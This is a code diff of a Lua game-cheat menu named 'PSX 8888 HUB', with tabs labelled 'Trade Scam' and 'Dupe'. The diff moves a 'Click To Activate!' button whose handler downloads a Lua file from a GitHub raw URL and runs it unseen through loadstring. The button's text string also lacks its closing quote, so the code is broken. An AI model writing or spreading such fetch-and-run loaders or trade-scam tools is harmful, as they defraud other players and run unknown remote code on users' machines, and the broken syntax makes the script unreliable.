@@ -5,10 +5,10 @@ local Window = Library.CreateLib("PSX 8888 HUB", "Midnight")
 local Main = Window:NewTab("Trade Scam")
 local MainSection = Main:NewSection("Trade Scam")
 
-MainSection:NewButton("Click To Activate!", "Script BY 8888 Team!, function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Maset0/dsdsdsd/main/info.lua"))()
-end)
-
 --Dupe
 local Dupe = Window:NewTab("Dupe")
 local DupeSection = Dupe:NewSection("PSX-Dupe")
+
+MainSection:NewButton("Click To Activate!", "Script BY 8888 Team!, function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Maset0/dsdsdsd/main/info.lua"))()
+end)
